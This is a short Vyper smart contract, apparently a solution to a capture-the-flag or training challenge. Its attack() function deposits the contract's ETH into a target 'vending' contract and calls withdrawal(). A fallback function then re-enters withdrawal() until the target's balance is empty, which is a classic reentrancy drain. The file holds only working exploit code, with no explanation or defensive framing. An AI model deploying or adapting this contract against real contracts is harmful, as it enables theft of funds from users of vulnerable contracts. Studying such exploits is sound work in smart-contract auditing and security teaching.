# @version ^0.3.7

owner: immutable(address)

vending: address

@external
@payable
def __init__(_vending: address):
    assert msg.value == as_wei_value(0.1, "ether"), "send 0.1 ETH"
    owner = msg.sender
    self.vending = _vending

@external
def attack():
    assert msg.sender == owner, "!owner"
    raw_call(
        self.vending,
        method_id("deposit()"),
        value=self.balance,
    )
    raw_call(self.vending, method_id("withdrawal()"))

@external
@payable
def __default__():
    if self.vending.balance > 0:
        raw_call(self.vending, method_id("withdrawal()"))
    else:  
        pass

